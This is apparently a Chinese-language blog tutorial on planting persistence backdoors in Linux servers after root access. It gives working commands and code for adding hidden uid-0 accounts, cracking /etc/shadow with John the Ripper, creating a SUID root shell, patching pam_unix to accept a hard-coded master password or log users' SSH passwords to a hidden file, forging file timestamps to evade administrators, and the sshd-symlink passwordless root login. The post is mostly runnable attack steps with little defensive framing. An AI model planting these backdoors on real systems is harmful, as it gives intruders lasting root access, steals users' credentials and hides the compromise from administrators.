---
legacyHtml: true
legacySymbols: 10407
title: linux 服务器常见的留后门方式（一）
date: "2022-04-02T15:35:57.000Z"
updated: "2025-01-21T06:58:19.686Z"
tags:
  - Backdoor
  - Linux
  - Kali
categories:
  - CyberSecurity
  - 后门
cover: >-
  https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
description: "整理好了搭环境的文章：LINUX 后门复现环境搭建 攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的后门。其目的是，方便攻击者以后对该服务器进行持久性的攻击。 其中，在 linux 服务器上留后门的常见技术，本文中会提及如下几种： 增加用户账号 破解用户密码 放置 SUID Shell PAM 后门 SSH 软链"
---

<div class="note primary">
<p>整理好了搭环境的文章：<a href="https://blog.sycamore.top/2022/03/21/LINUX%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">LINUX 后门复现环境搭建</a></p>
</div>
<p>攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的<strong>后门</strong>。其目的是，方便攻击者以后对该服务器进行持久性的攻击。</p>
<p>其中，在 linux 服务器上留后门的常见技术，<strong>本文中会提及</strong>如下几种：</p>
<ul>
<li>增加用户账号</li>
<li>破解用户密码</li>
<li>放置 SUID Shell</li>
<li>PAM 后门</li>
<li>SSH 软链接后门<br />
...</li>
</ul>
<h2 id="增加用户账号"><a class="anchor" href="#增加用户账号">#</a> 增加用户账号</h2>
<p><strong>前提</strong>：getshell，已获得服务器的 root 权限</p>
<h3 id="uid0用户可远程登陆"><a class="anchor" href="#uid0用户可远程登陆">#</a> uid=0 用户可远程登陆</h3>
<p>可以通过下面这一行指令，增加一个<strong>超级用户账号</strong>：<br />
 <code>echo &quot;用户名:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</code> <br />
 然后通过： <code>passed 用户名</code> 命令，修改所设超级用户的密码</p>
<h4 id="实现"><a class="anchor" href="#实现">#</a> 实现：</h4>
<p>输入命令：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441422/Typera/2023/04/a0f37b7036c0a7b07b57165d34510dc9.png" alt="image-20230426005018227" /><br />
（增加超级用户 backdoor）<br />
然后通过 ssh 登录 backdoor 账户：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441429/Typera/2023/04/a74b221974a59bbf958dea2d1d49823f.png" alt="image-20230426005025313" /><br />
 可以看到已经是 root 权限了：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441436/Typera/2023/04/2523b36be81cd6a668b416a6bbf6ca66.png" alt="image-20230426005032317" /></p>
<p>原理：给服务器增加一个<strong> ID 为 0</strong> 的账号（因为<strong> root</strong> 的 ID 为 0）<br />
我们可以通过 <code>vim /etc/passwd</code>  命令打开 passwd，所有用户名称与 ID 的对应关系都保存在这里。<br />
在文件开头，能看到 root:<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441444/Typera/2023/04/8c6aa69ccdebdd7b75bfaddbc6d434d4.png" alt="image-20230426005041049" /> 在文件的最后，我们能够找到刚刚添加的账号（backdoor）<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441452/Typera/2023/04/198980bd4423bb1cd26fcb757cbea990.png" alt="image-20230426005048939" /> 已禁止 uid=0 用户远程登陆</p>
<p>管理员可以<strong>禁止 root 用户</strong>通过<strong> ssh</strong> 的方式，远程登录服务器。</p>
<p><strong>禁止方法</strong>如下：<br />
（首先保证拥有一个普通用户，否则禁用之后就无法远程登陆了）<br />
 <code>vim /etc/ssh/sshd_config</code>  打开 sshd_config 文件<br />
找到  <code>PermitRootLogin</code> ，改为 no<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441458/Typera/2023/04/fd0d61d6e7b7879eb2ea1d5f0de03dd5.png" alt="image-20230426005055500" /> 然后重启 ssh 服务<br />
此时再通过 xshell 远程登录 root 账户，就会被拒绝：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441465/Typera/2023/04/d70b4faf22b9b537f1bbe6bb7f20d1f3.png" alt="image-20230426005101801" /></p>
<p>如果遇到了禁用 uid=0 账户远程登录的情况，也可以增加一个<strong>普通用户</strong>：<br />
 <code>echo &quot;用户名:x:1000:1000::/:/bin/sh&quot; &gt;&gt; /etc/passwd</code> <br />
 道理都是一样的，可以观察到，我们使用的普通用户的 ID 就是 1000</p>
<h3 id="无交互情况下添加账户"><a class="anchor" href="#无交互情况下添加账户">#</a> 无交互情况下添加账户</h3>
<p>所利用漏洞的不一样，会导致攻击者可能面临无法交互、没有回显的情况，<br />
在这种情况下，使用前两种方法是困难的，先给出如下的方法：</p>
<p>命令 <code>useradd 用户名 -u 0 -o -g root -G root</code>  以及 <code>echo &quot;密码&quot; | passwd --stdin 用户名</code> ，<br />
若服务器基于<strong> Debian</strong>，即不能使用 --stdin 操作的话，第二条改用命令 <code>echo 用户名:密码 | chpasswd</code> ，或者粗暴地直接用 \n 回车（因为 passwd 是需要<strong>输入两次</strong>密码的）： <code>echo &quot;密码\n密码&quot; | passwd 用户名</code></p>
<ul>
<li>第一个命令：使用 useradd 命令增加用户，-u 设置用户 id 为 0（root 用户），-g-G 设置新用户所在群组及附加群组为 root。如果禁止 root 远程登录，更改对应的参数就行。</li>
<li>第二个命令：添加密码（linux 中新创建的用户是被锁定的，需使用 passwd 命令设置密码，才能投入使用）</li>
</ul>
<h3 id=""><a class="anchor" href="#">#</a> </h3>
<p>但是这种增加用户账号的方法，会很轻易地被管理员发现</p>
<h2 id="破解用户密码"><a class="anchor" href="#破解用户密码">#</a> 破解用户密码</h2>
<p>如果我们获得了某些用户的密码，那下次自然就可以直接登录了。</p>
<p>linux 在 passwd 中存储了用户的信息，但是 passwd 文件允许<strong>所有用户读取</strong>，所以若是用户密码也存放在 passwd 中，将导致用户密码<strong>泄露</strong>。<br />
因此 Linux 将密码信息<strong>单独存放</strong>到 shadow 文件中。shadow <strong>只有 root 用户</strong>拥有读权限，其他用户<strong>没有任何权限</strong>，从而保证用户密码的安全性。</p>
<p>但是，如果获得 shadow 文件 **（/etc/shadow）**，你会看到里面的密码是这样的：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441478/Typera/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png" alt="image-20230426005115328" /> 当然是密码的 hash 值，不会让你直接看到的密码的明文</p>
<p>但是，对于那些薄弱的密码，我们可以通过 <strong>John the Ripper</strong> 弱口令扫描工具（Kali 自带）进行破解。使用方法如下</p>
<ol>
<li>使用 unshadow 命令组合 passwd 和 shadow，获得 test： <code>unshadow /etc/passwd /etc/shadow &gt; test</code></li>
<li>字典破解：使用自带的字典（usr/share/john/password.lst）：命令 <code>john test</code> <br />
 使用自己的字典：命令 <code>john --wordlist=字典路径 test</code></li>
</ol>
<h2 id="放置suid-shell"><a class="anchor" href="#放置suid-shell">#</a> 放置 SUID Shell</h2>
<p>前提：getshell，已获得服务器的 root 权限</p>
<p>SUID Shell 是一种<strong>能以 shell 拥有者权限运行</strong>的 shell，<br />
这个后门其实就是更改了，拥有者为 root 的 shell 的属性（rwsr-xr-x）</p>
<h3 id="命令"><a class="anchor" href="#命令">#</a> 命令</h3>
<p>root 下执行命令：<br />
 <code>cp /bin/bash .shell</code> <br />
 <code>chmod u+s .shell</code> <br />
 解释：</p>
<ol>
<li>复制 /bin/bash 为当前目录下名为 .shell 的文件，</li>
<li>更改 .shell 文件权限，设置为 u+s 后，其他用户<strong>都享有文件拥有者的权限</strong>（而当前为 <strong>root</strong>，即享有 root 权限）</li>
</ol>
<p>下次如果从普通用户登录服务器，就能用命令： <code>/.shell</code>  ，运行这个 shell，从而获得 <strong>root</strong> 权限。<br />
但是，bash2 针对 SUID Shell 做了一些<strong>护卫措施</strong>，所以如果使用上述命令运行 .shell ，只能当你在<strong>本地</strong>下（非远程连接）才能让 shell 的权限升为 root ，若是在远程运行，则还是原来的权限不变。</p>
<p>对于这种情况，需要使用这个命令运行： <code>/.shell -p</code> ，这样在远程下也能获得 root 的 shell 了 &gt;</p>
<h3 id="实现-2"><a class="anchor" href="#实现-2">#</a> 实现</h3>
<p><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441485/Typera/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png" alt="image-20230426005121969" /><br />
whoami 为 root</p>
<h2 id="pam后门"><a class="anchor" href="#pam后门">#</a> PAM 后门</h2>
<h3 id="pam简介"><a class="anchor" href="#pam简介">#</a> PAM 简介：</h3>
<p>在 Linux 中执行某些程序时，执行前要先对启动它的用户进行认证，比如我们经常使用的 <strong>su</strong> 命令。<br />
但是，实际工作时，我们常常得用<strong>不同的认证机制</strong>去认证不同程序的账号口令，这就会导致一个主机上有多个<strong>不同的认证系统</strong>，这显然是不合理的。<br />
所以就有了<strong> PAM 机制</strong>。<strong>PAM</strong> 可以说是一套<strong> API</strong>，使管理员可以随意地选择程序的认证方式。<br />
PAM 使用目录 **/etc/pam.d/<strong> 下的配置文件，即对应着不同的认证方式。程序调用目录下相应的配置文件，从而调用本地的认证模块（</strong>/lib/security/**）。</p>
<h3 id="后门思路"><a class="anchor" href="#后门思路">#</a> 后门思路：</h3>
<p>我们<strong>登录</strong>的时候，也是用 PAM 模块来验证我们的密码是否正确的。<br />
所以，我们可以从源码中找到<strong> PAM</strong> 的传统密码验证模块（pam_unix.so），<strong>修改 PAM 的验证逻辑</strong>，达成不去跟 shadow 里的密码校验，而是<strong>直接返回验证正确</strong>的效果，<br />
然后编译出<strong>包含后门的 so 文件</strong>，替换原模块。</p>
<h3 id="实现-3"><a class="anchor" href="#实现-3">#</a> 实现：</h3>
<ol>
<li>直接使用脚本：<a href="https://github.com/litsand/shell/blob/master/pam.sh">https://github.com/litsand/shell/blob/master/pam.sh</a></li>
<li>手动更改</li>
</ol>
<h4 id="下载pam源码"><a class="anchor" href="#下载pam源码">#</a> 下载 PAM 源码</h4>
<p>首先确认 PAM 版本：</p>
<ul>
<li>Debian： <code>dpkg -s libpam-modules | grep -i version | cut -d' ' -f2</code></li>
<li>Centos： <code>rpm -qa|grep pam</code></li>
</ul>
<p>以我的 kali 为例，使用 <code>dpkg -s libpam-modules | grep -i version | cut -d' ' -f2</code> ，得到输出：<strong>1.4.0-11</strong><br />
 去 <a href="http://www.linux-pam.org/library/">http://www.linux-pam.org/library/</a> 或者 GitHub 发布稳定版的地址 <a href="https://github.com/linux-pam/linux-pam/releases%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%88%B0%E8%87%AA%E5%B7%B1%E7%89%88%E6%9C%AC%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%9A">https://github.com/linux-pam/linux-pam/releases，下载到自己版本的源码：</a><br />
<strong>下载</strong>： <code> wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz</code> <br />
<strong> 解压</strong>： <code>tar -xvf Linux-PAM-1.4.0.tar.xz</code></p>
<h4 id="修改源码"><a class="anchor" href="#修改源码">#</a> 修改源码</h4>
<p><strong>效果 1：自定义密码添加：</strong></p>
<p>修改解压目录下的 <code>/modules/pam_unix/pam_unix_auth.c</code>  文件：<br />
第 173 行下加入： <code>if (strcmp(p,&quot;密码&quot;)==0) &#123;return PAM_SUCCESS;&#125;</code></p>
<p><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441501/Typera/2023/04/34fdc632b2e79b17065c6ee808b2095f.png" alt="image-20230426005137550" /></p>
<p>很简单的代码：当输入的 p 和我们设定的 &quot;密码&quot; 相同的时候，返回直接验证成功。</p>
<p><strong>编译：</strong></p>
<p>确保有安装<strong> gcc 编译器</strong>和<strong> flex 库</strong>，<br />
<strong>编译</strong>命令如下：</p>
<pre><code>cd Linux-PAM-1.4.0
./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr
make
</code></pre>
<p>未防止修改的 so 不正确，先找到原文件<strong>备份</strong>一个：</p>
<p>命令 <code>find / -name &quot;pam_unix.so&quot;</code>   （找原文件地址）<br />
我<strong>原文件</strong>的地址在：<strong>/usr/lib/x86_64-linux-gnu/security/pam_unix.so</strong><br />
 编译出的<strong>新文件</strong>在：<strong>root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so</strong><br />
 <code>cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak</code> （备份在 /tmp/pam_unix.so.bak）<br />
 <code>cp /root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so</code> （复制新 so 文件，覆盖原文件）</p>
<p><strong>尝试用设定的密码登录：</strong></p>
<p>（注意登录的需要是已有账户） <code>ssh 已有账户名@192.168.158.128</code> <br />
 用自定义的 <strong>hello</strong> 密码，登录 root 成功：</p>
<p><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441509/Typera/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png" alt="image-20230426005144666" /></p>
<p><strong>不足 &amp; 优化：</strong></p>
<ul>
<li>若是管理员<strong>查看登录日志</strong>：<br />
实时查看最后 10 条  <code>tail -f -n 10 /var/log/auth.log</code> （视具体情况不同，日志也有可能是 /var/log/secure）<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441513/Typera/2023/04/69c6d32a187e72672948a797b8239c8a.png" alt="image-20230426005149260" /><br />
 第一条是从 ssh 输入<strong>正确密码</strong>登录的日志，第二条是输入<strong>自定义的密码</strong>登陆的日志，<br />
可以看到，第二条会比第一条多出一行记录，<strong>报告验证失败</strong>，<br />
这是因为，在我们添加语句的前一行，先使用了 <strong>_unix_verify_password</strong> 函数进行了验证：<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441525/Typera/2023/04/36756d8cdaf5be17fc933eb923916d51.png" alt="image-20230426005201757" /><br />
 既然如此，我们可以找到函数 _unix_verify_password 的<strong>位置</strong>，在它验证之前，插入之前的那行代码，这样就能够<strong>避免验证密码报错</strong>。<br />
更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441530/Typera/2023/04/206c7138eeede30e24a10e586daa7fcc.png" alt="image-20230426005205935" /><br />
 重新编译覆盖之后，ssh 远程登录，查看日志：<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441538/Typera/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png" alt="image-20230426005213331" /><br />
 可以看到，第三条就和第一条一样了。<br />
&lt;br&gt;</li>
<li>若是管理员查看<strong>文件修改的时间</strong>：<br />
可以用 touch -r 命令修改新文件的时间：<br />
 <code>touch pam_unix.so -r /tmp/pam_unix.so.bak</code> （改为备份文件的时间）<br />
修改前后用 <code>stat pam_unix.so*</code>  命令查看结果如下所示：<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441542/Typera/2023/04/63ec0bad9935885af21524b174d934d7.png" alt="image-20230426005217672" /><br />
（仅更改了两项，可能还是会被管理员察觉，但是通过 -t 可以设定档案的时间记录)</li>
</ul>
<p>&lt;br&gt;<br />
<strong> 效果 2：记录通过 ssh 登录的用户密码：</strong></p>
<p>同样修改解压目录下的 <code>/modules/pam_unix/pam_unix_auth.c</code>  文件：<br />
在第 173 行下加入，如下图所示：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441547/Typera/2023/04/e0996c17577375def40744fabaf69c5e.png" alt="image-20230426005222756" /><br />
 每次有用户登录的时候，将用户名 name 和密码 p 保存在 /tmp/.record_pwd 文件中</p>
<p>保存 -&gt; 编译 -&gt; 覆盖 -&gt; 从 ssh 用正常密码登录几次账号，提供记录的数据 -&gt; 查看保存的文件：<br />
 <code>cat /tmp/.record_pwd</code> <br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441550/Typera/2023/04/c09d43ce405bdb94fdbbc667420539ad.png" alt="image-20230426005227686" /></p>
<h2 id="ssh软连接后门"><a class="anchor" href="#ssh软连接后门">#</a> SSH 软连接后门</h2>
<p><strong>前提</strong>：</p>
<ul>
<li>getshell，已获得服务器的 root 权限，</li>
<li>ssh 配置中开启了 PAM 进行身份验证（验证 PAM 是否开启： <code>cat/etc/ssh/sshd_config|grep UsePAM</code> ）一般默认开启</li>
<li>防火墙关闭，或者开放了使用的端口号</li>
</ul>
<h3 id="原理"><a class="anchor" href="#原理">#</a> 原理：</h3>
<ul>
<li>
<p><strong>软连接简介：</strong><br />
软链接，就是一个指向另一个档案位置的，特殊的档案。<br />
软连接以路径的形式存在。类似于 Windows 操作系统中的<strong>快捷方式</strong>。</p>
</li>
<li>
<p>若 ssh 配置中<strong>开启了 PAM 身份验证机制</strong>，PAM 模块会搜寻相关设定文件（一般在 **/etc/pam.d/<strong>）。<br />
而在</strong> /etc/pam.d/su<strong> 文件中启用了</strong> pam_rootok.so** 模块。<br />
该模块可以使 root 用户直接通过身份认证，<strong>不需要</strong>输入密码。</p>
</li>
<li>
<p>当我们指定的端口的软链接文件为 <strong>/ 路径 /su</strong> 的时候，若从该端口<strong>连接 ssh</strong>，<strong>PAM</strong> 就会去路径 <code>/etc/pam.d/</code>  下找到对应的配置文件，即 **/etc/pam.d/su**，<br />
然后使用 <strong>su</strong> 中启用的<strong> pam_rootok.so</strong> 模块，实现无密登录。</p>
</li>
</ul>
<h3 id="创建root账户"><a class="anchor" href="#创建root账户">#</a> 创建 root 账户</h3>
<p>创建 ssh 软链接： <code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=端口号</code> （端口号确保可用）</p>
<p>这条命令，先是使用 ln 强制 (-f) 创建，路径为 <code>/usr/sbin/sshd</code>  文件的软连接 (-s)，并保存为 <code>/usr/local/su</code>  文件（<strong>路径随意</strong>、<strong>文件名可变</strong>），然后把 su 文件（sshd）连到指定的端口</p>
<p>其中，创建的软连接名字虽然可变，但是也<strong>不能随便命名</strong>。可用的名字可以通过命令： <code>find /etc/pam.d|xargs grep &quot;pam_rootok&quot;</code>  查看：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441558/Typera/2023/04/fc163d487f4169876de475b8ddda580f.png" alt="image-20230426005233857" /></p>
<h3 id="实现-4"><a class="anchor" href="#实现-4">#</a> 实现：</h3>
<p><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441561/Typera/2023/04/ca4d722ad8a618c1764639e0467bfd32.png" alt="image-20230426005237555" /></p>
<p>这时候就能从 2333 端口，用 root 身份登入了（ <code>ssh root@192.168.158.128 -p 2333</code> ）：<br />
这里使用 cmd 演示：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441566/Typera/2023/04/b10b4b1d4b022009231a95b178468b94.png" alt="" /></p>
<h3 id="创建其它账户"><a class="anchor" href="#创建其它账户">#</a> 创建其它账户</h3>
<p>PAM 中事先是没有供其他用户免密登录的配置文件的，所以，要事先使用下面的命令，用 echo 把引号内的内容保存到 <code>/etc/pam.d/用户名</code> 的文件里面，让以你的用户名为文件名的配置文件使用<strong> pam_rootok.so</strong> 模块。</p>
<pre><code>echo &quot; 
 #%PAM-1.0
 auth       sufficient   pam_rootok.so
 auth       include      system-auth
 account    include      system-auth
 password   include      system-auth
 session    include      system-auth &quot; &gt;&gt; /etc/pam.d/已有的用户名
</code></pre>
<p>现在可以看到，在 <code>/etc/pam.d/</code>  文件夹下出现了一个，以你设定的用户名为名的配置文件（这里为<strong> kali</strong>）：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441571/Typera/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png" alt="image-20230426005247027" /></p>
<p>现在再执行 <code>find /etc/pam.d|xargs grep &quot;pam_rootok&quot;</code>  命令查找，可以看到，可用的名字已经多了一个<strong> kali</strong> 了：<br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441578/Typera/2023/04/1083edad21219c631ebbe5a28ceaba4f.png" alt="image-20230426005254226" /><br />
 现在再使用命令： <code>ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=端口号</code> 创建软链接，就能达到普通用户免密登陆的效果</p>
<p><strong>实现：</strong><br />
<img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441582/Typera/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png" alt="image-20230426005258790" /></p>
<p><img loading="lazy" src="https://res.cloudinary.com/sycamore/image/upload/v1682441588/Typera/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png" alt="image-20230426005304178" /></p>
